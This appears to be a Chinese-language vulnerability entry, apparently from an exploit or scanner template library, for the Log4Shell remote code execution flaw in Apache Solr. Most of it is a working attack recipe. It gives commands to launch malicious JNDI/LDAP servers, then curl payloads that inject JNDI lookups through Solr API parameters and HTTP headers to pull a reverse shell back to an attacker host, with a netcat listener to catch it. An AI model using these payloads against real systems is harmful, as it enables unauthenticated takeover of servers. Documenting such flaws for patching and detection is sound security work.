---
id: SOLR-LOG4J-RCE
title: Apache Solr Log4j 组件远程代码执行漏洞
product: solr
vendor: Apache
version_affected: "all versions using Log4j 2.x < 2.17.0"
severity: CRITICAL
tags: [rce, jndi, 无需认证]
fingerprint: ["Solr", "Solr Admin", "Apache Solr"]
---

## 漏洞描述

Apache Solr 使用 Log4j 2.x 作为日志组件，受 Log4Shell（CVE-2021-44228）漏洞影响。攻击者可在 Solr API 的任意会被记录到日志的参数中注入 JNDI 表达式（如 `${jndi:ldap://...}`），触发 Solr 向攻击者控制的 LDAP/RMI 服务器发起请求并加载恶意类，实现远程代码执行。

## 影响版本

- Apache Solr（所有使用 Log4j 2.0-beta9 至 2.14.1 的版本）
- Apache Solr 7.x（未升级 Log4j 的版本）
- Apache Solr 8.x < 8.11.1
- 已修复版本: Apache Solr 8.11.1+（升级 Log4j 至 2.17.0）

## 前置条件

- 无需认证
- 能够访问 Solr API（默认 8983 端口）
- 目标 JVM 未设置 `log4j2.formatMsgNoLookups=true`
- 目标网络可出站访问攻击者的 LDAP/RMI 服务

## 利用步骤

1. 在攻击者服务器上启动恶意 LDAP/RMI 服务（如 JNDIExploit、marshalsec）
2. 向 Solr API 发送包含 JNDI 表达式的请求
3. Solr 日志组件解析 JNDI 表达式并向攻击者 LDAP 服务发起请求
4. 攻击者 LDAP 服务返回恶意类引用，Solr 加载并执行

## Payload

```bash
# 步骤1: 启动恶意 JNDI 服务（在攻击者机器上）
# 使用 JNDIExploit:
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ATTACKER_IP -p 8888 -l 1389

# 或使用 marshalsec:
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit" 1389
```

```bash
# 步骤2: 通过 Collections API action 参数注入
curl "http://target:8983/solr/admin/collections?action=\${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/PORT}&wt=json"
```

```bash
# 步骤3: 通过 Core Admin API 注入
curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/PORT}&wt=json"
```

```bash
# 步骤4: 通过搜索参数注入（任何被日志记录的参数均可）
curl "http://target:8983/solr/admin/info/system?_=\${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/PORT}"
```

```bash
# 步骤5: 通过 HTTP Header 注入
curl -H "X-Forwarded-For: \${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/PORT}" \
  "http://target:8983/solr/"

curl -H "User-Agent: \${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/PORT}" \
  "http://target:8983/solr/"
```

## 验证方法

```bash
# 方法1: JNDI 回调验证（推荐，仅确认漏洞存在）
# 在攻击者机器上启动监听
nc -lvp 1389
# 发送 JNDI payload
curl "http://target:8983/solr/admin/collections?action=\${jndi:ldap://ATTACKER_IP:1389/test}&wt=json"
# 检查 nc 监听器是否收到连接（收到即确认存在漏洞）

# 方法2: 使用 DNSLog 外带验证
curl "http://target:8983/solr/admin/cores?action=\${jndi:ldap://RANDOM.dnslog.cn}&wt=json"
# 检查 DNSLog 平台是否有 DNS 解析记录

# 方法3: 完整 RCE 验证（需启动 JNDI 利用服务）
# 攻击者启动 nc 监听: nc -lvp 4444
# 攻击者启动 JNDIExploit: java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ATTACKER_IP -l 1389
curl "http://target:8983/solr/admin/collections?action=\${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/4444}&wt=json"
# 检查 nc 是否获得反弹 shell
```

## 指纹确认

```bash
curl -s "http://target:8983/solr/" | grep -i "solr"
curl -s "http://target:8983/solr/admin/info/system?wt=json" | grep -i "solr-spec-version\|lucene-spec-version"
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228
- https://logging.apache.org/log4j/2.x/security.html
- https://github.com/fullhunt/log4j-scan
